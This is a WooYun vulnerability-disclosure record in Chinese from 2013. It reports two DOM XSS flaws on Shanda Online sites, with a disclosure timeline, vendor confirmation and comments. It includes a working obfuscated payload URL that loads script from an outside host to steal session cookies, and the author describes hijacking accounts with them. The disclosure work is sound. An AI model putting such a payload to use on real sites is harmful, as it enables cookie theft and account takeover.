{"id": 64884, "wybug_id": "wooyun-2013-022578", "wybug_title": "盛大在线两个DOM+XSS(可以劫持账户)", "wybug_corp": "盛大在线", "wybug_author": "梧桐雨", "wybug_date": "2013-07-10 17:56", "wybug_open_date": "2013-08-24 17:56", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-24：\t细节向公众公开  简要描述： 可劫持账户登录 详细说明：  盛大在线有两个DOMXSS。考虑到危害还是发一下，之前发的集合没通过，可能没演示到危害吧，这次演示一下吧，DOMXSS可以过所有浏览器。出现DOMXSS的两个站点：wan.sdo.com以及t.sdo.com。先说wan.sdo.com，问题出在app_code参数，直接输出在js之间，然而结束之后没有任何过滤：\n\n代码大约在500多行，如图：\n\n这样就不难构造偷取cookie的代码了。不明白的可以参考我前面发的几个案例，这里继续用eval()来构造：构造好的连接如下：\nhttp://wan.sdo.com/?r=site/pay&app_code=100001700%0aeval('window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,49,50,54,46,97,109,47,118,106,85,120,79,51);document.body.appendChild(window.s)')\n当受害者访问之后，cookie就会发送到我邮箱\n\n拿cookie去登录：\n\n成功劫持   漏洞证明：  另外一个在t.sdo.com\n\n这个没有上面那个危害那么严重，考虑来修吧。   修复方案：  转义字符，过滤参数。   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-07-10 19:31 厂商回复： 感谢您对盛大安全的关注，正在联系开发修复，谢谢提交。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-11 16:21 |    \t\t盛大网络(乌云厂商)\t\t \n  修改cookie推荐使用greasemonkey的cookie injector脚本,用阿D有点过时，亲!    \n     2013-07-11 16:28 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @盛大网络 好~~多谢多谢    \n     2013-08-09 20:27 |    \t\t橙夏 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:4        | 喵呜喵呜喵呜呜呜 喵呜呜喵呜呜呜呜 喵呜呜...)\t\t \n  @xsser 1L是不是可以乌云一下    \n     2013-08-09 22:30 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  1楼必火！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}